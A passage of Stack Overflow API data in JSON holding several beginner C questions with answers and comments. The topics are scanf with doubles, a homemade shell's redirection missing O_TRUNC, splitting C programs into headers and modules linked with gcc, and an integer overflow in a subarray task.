"display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "edited": false, "score": 2, "creation_date": 1447235536, "post_id": 33647766, "comment_id": 55069333, "body": "@Basilm Can not reproduce your problem. Running it with Input &quot;12.00/n13.00&quot; will return &quot;12.00/n13.00&quot;. See: <a href=\"https://ideone.com/VHqCPi\" rel=\"nofollow noreferrer\">ideone.com/VHqCPi</a>"}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 1, "creation_date": 1447235822, "post_id": 33647766, "comment_id": 55069518, "body": "A complete problem description not only states the code and <i>observed</i> output (which you did), but <b>also</b> the <i>input</i> and the <i>expected output</i> (which is missing). Make this a kind of mental checklist when posting here, filing a bug report etc."}, {"owner": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "edited": false, "score": 1, "creation_date": 1447235865, "post_id": 33647766, "comment_id": 55069543, "body": "Probably not the cause, but I believe <code>%lf</code> is pointless (possibly wrong?) with <code>printf</code>; the <code>%f</code> format code already handles <code>double</code>s, the <code>l</code> either means nothing, or might be making it look at the completely wrong register (if it tries to interpret it as meaning &quot;use an architecture specific long double register instead of the normal location&quot;)."}, {"owner": {"reputation": 904, "user_id": 4004688, "user_type": "registered", "accept_rate": 67, "profile_image": "https://graph.facebook.com/1002512873/picture?type=large", "display_name": "Itay Sela", "link": "https://stackoverflow.com/users/4004688/itay-sela"}, "edited": false, "score": 1, "creation_date": 1447236122, "post_id": 33647766, "comment_id": 55069683, "body": "Works just fine for me"}, {"owner": {"reputation": 3853, "user_id": 2474248, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/BDsoE.jpg?s=128&g=1", "display_name": "machine_1", "link": "https://stackoverflow.com/users/2474248/machine-1"}, "edited": false, "score": 0, "creation_date": 1447236833, "post_id": 33647766, "comment_id": 55070093, "body": "The code is perfectly valid"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "edited": false, "score": 1, "creation_date": 1447236865, "post_id": 33647766, "comment_id": 55070110, "body": "@ShadowRanger isn&#39;t it like the <code>l</code> in <code>lf</code> should be <i>ignored</i>?"}, {"owner": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "edited": false, "score": 1, "creation_date": 1447237593, "post_id": 33647766, "comment_id": 55070526, "body": "always check the return value of input funcions! <code>if (scanf(&quot;%lf&quot;, &amp;b) != 1) &#47;* error *&#47;;</code>"}, {"owner": {"reputation": 12521, "user_id": 4498329, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/b1bf128245aa5bcb1b740e8154296900?s=128&d=identicon&r=PG&f=1", "display_name": "skyking", "link": "https://stackoverflow.com/users/4498329/skyking"}, "edited": false, "score": 0, "creation_date": 1447237795, "post_id": 33647766, "comment_id": 55070637, "body": "I don&#39;t observe the claimed behavior. You should include: your inputs, your outputs, expected output (and possibly also which compiler you uses etc). Also make sure that the posted data should match - claiming that it outputs <code>a=0.0000</code>, <code>b=0.0000</code> doesn&#39;t give a good impression since the source doesn&#39;t even try to output <code>a=...</code> and <code>b=...</code>."}, {"owner": {"reputation": 25, "user_id": 5549982, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/485d54a0e5fe04e205632445f268161e?s=128&d=identicon&r=PG&f=1", "display_name": "Basilm", "link": "https://stackoverflow.com/users/5549982/basilm"}, "edited": false, "score": 0, "creation_date": 1447238428, "post_id": 33647766, "comment_id": 55071010, "body": "im obviously printing a and b in the line before the return. I try to input any possible number (integer , double , 1 , 2) and still prints 0.0000 as a and -0.0000 as b."}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 2, "creation_date": 1447238654, "post_id": 33647766, "comment_id": 55071131, "body": "@Basilm: If you observe one thing, and everybody else here observes something different, either your code or your environment differs from everybody else. Make sure you are actually using the binary compiled from the source you posted, <i>and please tell us your compiler brand and version</i>."}, {"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1447239965, "post_id": 33647766, "comment_id": 55071828, "body": "@Basilm: compile your actual code with all warnings and debug info (e.g. <code>gcc -Wall -Wextra -g</code> if using <a href=\"http://gcc.gnu.org/\" rel=\"nofollow noreferrer\">GCC</a>...). Then <b>use the debugger</b> (<code>gdb</code>). Read the documentation of every used function (notably of <a href=\"http://man7.org/linux/man-pages/man3/scanf.3.html\" rel=\"nofollow noreferrer\">scanf</a>...). Check against runtime errors (so use the result item count of <code>scanf</code>). Beware of <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow noreferrer\">undefined behavior</a>"}], "answers": [{"comments": [{"owner": {"reputation": 25, "user_id": 5549982, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/485d54a0e5fe04e205632445f268161e?s=128&d=identicon&r=PG&f=1", "display_name": "Basilm", "link": "https://stackoverflow.com/users/5549982/basilm"}, "edited": false, "score": 0, "creation_date": 1447237125, "post_id": 33648430, "comment_id": 55070249, "body": "Hello there , this is not my goal to just scan and print. But due to the errors that i got, I tried writing a new program just to check if the problem is occuring from my coding or something else. So i tried just scanning and printing to see if the scan is receiving the right values. For example: I type 3 to &#39;a&#39; , 4 to &#39;b&#39; and 5 to &#39;c&#39; , I receive &quot;0.0000 , -0.0000&quot;."}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 0, "creation_date": 1447237650, "post_id": 33648430, "comment_id": 55070555, "body": "I don&#39;t understand why this was downvoted. Each point is actually spot-on, including the check of <code>scanf()</code> return value (!)."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 25, "user_id": 5549982, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/485d54a0e5fe04e205632445f268161e?s=128&d=identicon&r=PG&f=1", "display_name": "Basilm", "link": "https://stackoverflow.com/users/5549982/basilm"}, "edited": false, "score": 1, "creation_date": 1447239268, "post_id": 33648430, "comment_id": 55071465, "body": "@Basilm:  We are aware that you skimmed down the problem to its core.  Yet your program does not show an obvious reason for the problem you describe.  Beyond the issues I mentioned in the answer, the input you give the program might be the cause. What characters do you type <b>exactly</b>.  What is your environment? How do you run the code?"}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": false, "score": 3, "last_activity_date": 1447239530, "last_edit_date": 1447239530, "creation_date": 1447237007, "answer_id": 33648430, "question_id": 33647766, "link": "https://stackoverflow.com/questions/33647766/scanf-double-in-c-not-giving-the-right-value/33648430#33648430", "title": "Scanf double in C not giving the right value", "body": "<p>Written as it is, your program will accept correctly formatted input for 3 floating point values and will print the first two.</p>\n\n<p>What values do you enter?</p>\n\n<p>What is the <strong>precise</strong> input you type into your program?</p>\n\n<p>I suspect you type extra characters: <code>scanf</code> stops scanning on invalid input.</p>\n\n<p>You should test the return value from the <code>scanf</code> function calls and verify that values were actually parsed.</p>\n\n<p>Incidentally, the <code>printf</code> format for <code>double</code> arguments is <code>%f</code>, not <code>%lf</code>, but this should not pose a problem as the extra <code>l</code> is most likely ignored.</p>\n\n<p>Here is a corrected version you should try to find out where the problem lies:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void) {\n    double a = 0, b = 0, c = 0;\n    if (scanf(\"%lf\", &amp;a) != 1) {\n        printf(\"invalid input for a\\n\");\n    }\n    if (scanf(\"%lf\", &amp;b) != 1) {\n        printf(\"invalid input for b\\n\");\n    }\n    if (scanf(\"%lf\", &amp;c) != 1) {\n        printf(\"invalid input for c\\n\");\n    }\n    printf(\"a=%f b=%f\\n\", a, b);\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 25, "user_id": 5549982, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/485d54a0e5fe04e205632445f268161e?s=128&d=identicon&r=PG&f=1", "display_name": "Basilm", "link": "https://stackoverflow.com/users/5549982/basilm"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 252, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1447239530, "creation_date": 1447234647, "last_edit_date": 1447237303, "question_id": 33647766, "link": "https://stackoverflow.com/questions/33647766/scanf-double-in-c-not-giving-the-right-value", "title": "Scanf double in C not giving the right value", "body": "<p>I would like to know where is my mistake. \nWhen scanning the parameters as doubles , and immediately printing them (for checking), the print is not giving me the values that I entered.\nI tried to define them as integers and it worked, but for doubles its just giving me this: <code>a=0.00000</code>, <code>b=-0.00000</code></p>\n\n<p>take a look:     </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdbool.h&gt;\n\nint main()\n{  \n    double a=0,b=0,c=0;\n\n    scanf(\"%lf\",&amp;a);\n    scanf(\"%lf\",&amp;b);\n    scanf(\"%lf\",&amp;c);\n\n    printf(\"%lf %lf\\n\",a,b);\n\n    return 0;\n}\n</code></pre>\n\n<p>EDIT: sorry i didnt include my whole code , this is the whole code, but it still gives me the same thing.</p>\n"}, {"tags": ["c", "file-io", "pipe"], "comments": [{"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 0, "creation_date": 1447235667, "post_id": 33647576, "comment_id": 55069422, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/33642756/clear-file-before-writing-with-open\">Clear file before writing with open()</a>"}], "answers": [{"comments": [{"owner": {"reputation": 861, "user_id": 3347983, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/8243b37287e4b3ba0643c419e847acc2?s=128&d=identicon&r=PG&f=1", "display_name": "\u4eca\u5929\u6625\u5929", "link": "https://stackoverflow.com/users/3347983/%e4%bb%8a%e5%a4%a9%e6%98%a5%e5%a4%a9"}, "edited": false, "score": 0, "creation_date": 1447234475, "post_id": 33647639, "comment_id": 55068732, "body": "Thank you so much. Works perfectly now. I guess I should totally take a break :D"}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 0, "creation_date": 1447235703, "post_id": 33647639, "comment_id": 55069451, "body": "Shouldn&#39;t this be a &quot;vote to close / duplicate of...&quot; instead of an answer?"}, {"owner": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "reply_to_user": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 0, "creation_date": 1447235991, "post_id": 33647639, "comment_id": 55069611, "body": "@DevSolar: I really don&#39;t know when something counts as a duplicate. The fundamental error is a duplicate, but the question is substantially different."}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 0, "creation_date": 1447237365, "post_id": 33647639, "comment_id": 55070400, "body": "@ShadowRanger: The <i>question</i> is different because the OP was unable (not willing?) to actually isolate the problem (as the OP of that other question did -- but then, <i>that</i> noteable was unable / unwilling to read the manpage of the function he was using). As long as answers in a linked question <i>solve the problem</i>, it&#39;s a duplicate. Ideally, we would have only <i>one</i> set of answers for every <i>cause</i> of a problem... but this is the internet. ;-) Have an upvote, anyway."}], "tags": [], "owner": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "is_accepted": true, "score": 4, "last_activity_date": 1447234208, "creation_date": 1447234208, "answer_id": 33647639, "question_id": 33647576, "link": "https://stackoverflow.com/questions/33647576/c-implementation-of-does-not-replace-file/33647639#33647639", "title": "C: implementation of &gt; does not replace file", "body": "<p>You left off <code>O_TRUNC</code> in the <code>open</code> flags. Oddly, <a href=\"https://stackoverflow.com/questions/33642756/clear-file-before-writing-with-open\">you're the second person this evening to make that mistake</a>.</p>\n"}], "owner": {"reputation": 861, "user_id": 3347983, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/8243b37287e4b3ba0643c419e847acc2?s=128&d=identicon&r=PG&f=1", "display_name": "\u4eca\u5929\u6625\u5929", "link": "https://stackoverflow.com/users/3347983/%e4%bb%8a%e5%a4%a9%e6%98%a5%e5%a4%a9"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 45, "favorite_count": 0, "accepted_answer_id": 33647639, "answer_count": 1, "score": 0, "last_activity_date": 1447234208, "creation_date": 1447233992, "question_id": 33647576, "link": "https://stackoverflow.com/questions/33647576/c-implementation-of-does-not-replace-file", "title": "C: implementation of &gt; does not replace file", "body": "<p>I am implementing the operator > in c for my own \"shell\".\nHowever, when typing in \"cat new.txt > new2.txt\" some strange things happen:</p>\n\n<pre><code>&gt; cat new.txt\nThis is a file. \nThis file contains some text.\n\n&gt; cat new2.txt\nThis is also afile. \nThis file also contains some text.\nThis file is called new2.txt.\n\n&gt; cat new.txt &gt; new2.txt\n\n&gt; cat new2.txt\nThis is a file. \nThis file contains some text.\nme text.\nThis file is called new2.txt.\n</code></pre>\n\n<p>Does anyone have an idea why this happens? I expect new2.txt to be deleted and then written to.</p>\n\n<p>Then line where I redirect the data is:</p>\n\n<pre><code>...\npipe(pipefd);\npid = fork();\nif (pid == 0)\n{\n  int fd = open(filename[OUT], O_WRONLY | O_CREAT, S_IRUSR | S_IWUSR);\n  dup2(fd, STDOUT_FILENO);\n  close(fd);\n  execvp(par[0], par);\n  exit(-1);\n}\nwaitpid(pid, NULL, 0);\nclose(pipefd[READ]);\nclose(pipefd[WRITE]);\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 51929, "user_id": 1524450, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BSzDV.png?s=128&g=1", "display_name": "Michael", "link": "https://stackoverflow.com/users/1524450/michael"}, "edited": false, "score": 0, "creation_date": 1447234007, "post_id": 33647534, "comment_id": 55068494, "body": "You compile all the .c files and link the corresponding object files together."}, {"owner": {"reputation": 3975, "user_id": 3560981, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/8fa10e8d564dd93ece697b0aebe689dd?s=128&d=identicon&r=PG&f=1", "display_name": "Nidhoegger", "link": "https://stackoverflow.com/users/3560981/nidhoegger"}, "edited": false, "score": 0, "creation_date": 1447234010, "post_id": 33647534, "comment_id": 55068496, "body": "The compiler does not need to know where to find the code, the compiler just needs the definition of the functions (the .h file), but the Linker needs to know. And you tell him! For example if you use certain functions from the <code>math.h</code>, you need to tell the linker that the code is in the <code>libm.so</code> file, so you give him the command line parameter <code>-lm</code>."}, {"owner": {"reputation": 307, "user_id": 5545760, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/78319955776d9966c396ecbb22de2592?s=128&d=identicon&r=PG&f=1", "display_name": "Bracketz", "link": "https://stackoverflow.com/users/5545760/bracketz"}, "edited": false, "score": 0, "creation_date": 1447234497, "post_id": 33647534, "comment_id": 55068742, "body": "How can I &quot;manually&quot; link two files via gcc command? (Suppose my main is the demo.c and bit.c has the functions I need)"}, {"owner": {"reputation": 579, "user_id": 5226749, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Ta78V.png?s=128&g=1", "display_name": "Vito Royeca", "link": "https://stackoverflow.com/users/5226749/vito-royeca"}, "edited": false, "score": 1, "creation_date": 1447235543, "post_id": 33647534, "comment_id": 55069342, "body": "<code>gcc -o demo demo.c bit.c</code> . You may need to create a <code>bit.h</code> and <code>#include</code> it into <code>demo.c</code> ."}, {"owner": {"reputation": 307, "user_id": 5545760, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/78319955776d9966c396ecbb22de2592?s=128&d=identicon&r=PG&f=1", "display_name": "Bracketz", "link": "https://stackoverflow.com/users/5545760/bracketz"}, "reply_to_user": {"reputation": 579, "user_id": 5226749, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Ta78V.png?s=128&g=1", "display_name": "Vito Royeca", "link": "https://stackoverflow.com/users/5226749/vito-royeca"}, "edited": false, "score": 0, "creation_date": 1447235868, "post_id": 33647534, "comment_id": 55069544, "body": "Thanks @jovit.royeca Very Appreciated!"}, {"owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "reply_to_user": {"reputation": 579, "user_id": 5226749, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Ta78V.png?s=128&g=1", "display_name": "Vito Royeca", "link": "https://stackoverflow.com/users/5226749/vito-royeca"}, "edited": false, "score": 0, "creation_date": 1447237046, "post_id": 33647534, "comment_id": 55070203, "body": "@jovit.royeca can I edit that as example for compiling with gcc into my answer or do you want to make your own? Seems like thats what OP has been looking for."}, {"owner": {"reputation": 579, "user_id": 5226749, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Ta78V.png?s=128&g=1", "display_name": "Vito Royeca", "link": "https://stackoverflow.com/users/5226749/vito-royeca"}, "reply_to_user": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "edited": false, "score": 0, "creation_date": 1447237133, "post_id": 33647534, "comment_id": 55070254, "body": "@Magisch yes you can  edit that as example for compiling with gcc into your answer."}], "answers": [{"tags": [], "owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "is_accepted": true, "score": 7, "last_activity_date": 1447238003, "last_edit_date": 1495540386, "creation_date": 1447234196, "answer_id": 33647635, "question_id": 33647534, "link": "https://stackoverflow.com/questions/33647534/what-is-recommended-way-to-create-modular-c-applications/33647635#33647635", "title": "What is recommended way to create modular C applications?", "body": "<p>Generally speaking inlcuding header files instead of complete c files is best practice yes. Your compiler does not need to know where any other code is, just the prototypes of the functions used. </p>\n\n<p>The part of the process that needs to know where the other code is is the Linker, which is not the compiler, but included in complete solutions like gcc. </p>\n\n<p>When compiling in gcc for instance, you can add references for the linker, as specifically noted in the comments.</p>\n\n<p>Credit to <a href=\"https://stackoverflow.com/users/5226749/jovit-royeca\">@jovit.royeca</a> for an example on linking with the compiler gcc:</p>\n\n<blockquote>\n  <p>Suppose you have a main file for your program called <code>demo.c</code> </p>\n  \n  <p>You are using some functions of the file <code>bit.c</code> in it. What you then\n  need to do is make a header called <code>bit.h</code> containing all global\n  variables and function prototypes from <code>bit.c</code> and then include it into <code>demo.c</code> with <code>#include \"bit.h\"</code> and then link it in gcc\n  like so:</p>\n  \n  <p><code>gcc -o demo demo.c bit.c</code></p>\n</blockquote>\n\n<p>Some complete solutions like eclipse for c/c++ automatically assume all c files in a project will be linked to the main one, for instance.</p>\n"}, {"comments": [{"owner": {"reputation": 307, "user_id": 5545760, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/78319955776d9966c396ecbb22de2592?s=128&d=identicon&r=PG&f=1", "display_name": "Bracketz", "link": "https://stackoverflow.com/users/5545760/bracketz"}, "edited": false, "score": 0, "creation_date": 1447234455, "post_id": 33647640, "comment_id": 55068717, "body": "Thanks Paul. I am creating my C applications in a very simple IDE called MS Notepad ;-). How can I &quot;manually&quot; link two files via gcc command?"}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "reply_to_user": {"reputation": 307, "user_id": 5545760, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/78319955776d9966c396ecbb22de2592?s=128&d=identicon&r=PG&f=1", "display_name": "Bracketz", "link": "https://stackoverflow.com/users/5545760/bracketz"}, "edited": false, "score": 0, "creation_date": 1447234607, "post_id": 33647640, "comment_id": 55068807, "body": "Bracketz, I don&#39;t know (don&#39;t know gcc) but, as we all know, &quot;If nothing helps, read the manual!&quot;; it will surely tell you how the command line should look like for this."}, {"owner": {"reputation": 4324, "user_id": 1045510, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/abde71672c5b271c778d3ed312347866?s=128&d=identicon&r=PG", "display_name": "Kroltan", "link": "https://stackoverflow.com/users/1045510/kroltan"}, "reply_to_user": {"reputation": 307, "user_id": 5545760, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/78319955776d9966c396ecbb22de2592?s=128&d=identicon&r=PG&f=1", "display_name": "Bracketz", "link": "https://stackoverflow.com/users/5545760/bracketz"}, "edited": false, "score": 0, "creation_date": 1447243662, "post_id": 33647640, "comment_id": 55073838, "body": "@Bracketz I know this might not be possible, but if you don&#39;t want to use a full IDE, you could use a coding-oriented text editor, which are very lightweight, open pretty fast and can be used normally, but has extra features. Some recommendations are <a href=\"http://www.sublimetext.com/\" rel=\"nofollow noreferrer\">Sublime Text</a>, <a href=\"http://atom.io/\" rel=\"nofollow noreferrer\">Atom</a>, or <a href=\"https://notepad-plus-plus.org/\" rel=\"nofollow noreferrer\">Notepad++</a>. Sorry if I incorrectly assumed you use Notepad for its simplicity, and already know about the alternatives."}], "tags": [], "owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "is_accepted": false, "score": 4, "last_activity_date": 1447234216, "creation_date": 1447234216, "answer_id": 33647640, "question_id": 33647534, "link": "https://stackoverflow.com/questions/33647534/what-is-recommended-way-to-create-modular-c-applications/33647640#33647640", "title": "What is recommended way to create modular C applications?", "body": "<p>The recommended way is to create modules (.c files) with a specific functionality; compare it to a class. To make this functionality available to other modules, you create a header file with the functions, data types and variables the module exposes (makes available).</p>\n\n<p>To create a program, you write or re-use the modules and call them from the main program (to call them, you should <code>#include</code> the header files).</p>\n\n<p>The makefile, or a \"project\" in an IDE tells your development environment/the compiler which modules/.c-files to compile and then the linker links them into an executable.</p>\n\n<p>Using modules as described alows you to hide their implementation (complexity) from other .c-files,</p>\n"}], "owner": {"reputation": 307, "user_id": 5545760, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/78319955776d9966c396ecbb22de2592?s=128&d=identicon&r=PG&f=1", "display_name": "Bracketz", "link": "https://stackoverflow.com/users/5545760/bracketz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 304, "favorite_count": 2, "closed_date": 1447248680, "accepted_answer_id": 33647635, "answer_count": 2, "score": 9, "last_activity_date": 1447238003, "creation_date": 1447233845, "question_id": 33647534, "link": "https://stackoverflow.com/questions/33647534/what-is-recommended-way-to-create-modular-c-applications", "closed_reason": "Needs more focus", "title": "What is recommended way to create modular C applications?", "body": "<p>I read in Stack Overflow that including a C file into another C file is not a best practice. I was wondering how can I then create modular applications in C.</p>\n\n<p>I understood that all you are recommended to include are header files, which doesn't contain the code implementation itself but just the \"function calls\".</p>\n\n<p>How does the compiler know where to find the respective code?\nDoes it automatically look to a <strong>.c</strong> file with same name as the <strong>.h</strong> file?</p>\n\n<p>Generally speaking, how can separate code within a C application?</p>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 2456, "user_id": 1749165, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/MVxNw.jpg?s=128&g=1", "display_name": "mumair", "link": "https://stackoverflow.com/users/1749165/mumair"}, "edited": false, "score": 1, "creation_date": 1447233548, "post_id": 33647389, "comment_id": 55068276, "body": "Already answered here: <a href=\"http://stackoverflow.com/questions/21713781/finding-the-longest-non-negative-sub-array\" title=\"finding the longest non negative sub array\">stackoverflow.com/questions/21713781/&hellip;</a>"}, {"owner": {"reputation": 3, "user_id": 3909905, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7c15e88cd462bdc09053e989c75bcaa8?s=128&d=identicon&r=PG&f=1", "display_name": "Code_Run", "link": "https://stackoverflow.com/users/3909905/code-run"}, "edited": false, "score": 0, "creation_date": 1447233804, "post_id": 33647389, "comment_id": 55068407, "body": "That is a different question beacuse in that, the array can include a negetive number which requires the whole sum of the subarray to be non negetive..But in this the sub array cannot have a negetive number.."}, {"owner": {"reputation": 3134, "user_id": 5475209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QRBxV.jpg?s=128&g=1", "display_name": "terence hill", "link": "https://stackoverflow.com/users/5475209/terence-hill"}, "edited": false, "score": 0, "creation_date": 1447234430, "post_id": 33647389, "comment_id": 55068699, "body": "So whenever you encounter a negative value, remove the value and split the array?"}, {"owner": {"reputation": 3, "user_id": 3909905, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7c15e88cd462bdc09053e989c75bcaa8?s=128&d=identicon&r=PG&f=1", "display_name": "Code_Run", "link": "https://stackoverflow.com/users/3909905/code-run"}, "edited": false, "score": 0, "creation_date": 1447234467, "post_id": 33647389, "comment_id": 55068727, "body": "Yea, whenever a negetive value is encountered in the array, until that part becomes the subarray and the next subarray starts after that negetive value. We have to now find the maximum of the sub arrays..We arent actually removing the negetive value.."}], "answers": [{"tags": [], "owner": {"reputation": 748, "user_id": 5381184, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/da66272a60130c5f545312f67e16d9a3?s=128&d=identicon&r=PG&f=1", "display_name": "BobRun", "link": "https://stackoverflow.com/users/5381184/bobrun"}, "is_accepted": true, "score": 0, "last_activity_date": 1447234487, "creation_date": 1447234487, "answer_id": 33647719, "question_id": 33647389, "link": "https://stackoverflow.com/questions/33647389/find-out-the-maximum-sub-array-of-non-negative-numbers-from-an-array/33647719#33647719", "title": "Find out the maximum sub-array of non negative numbers from an array", "body": "<p>You are using int and when you add you overflow the limit  2,147,483,647</p>\n"}], "owner": {"reputation": 3, "user_id": 3909905, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7c15e88cd462bdc09053e989c75bcaa8?s=128&d=identicon&r=PG&f=1", "display_name": "Code_Run", "link": "https://stackoverflow.com/users/3909905/code-run"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, 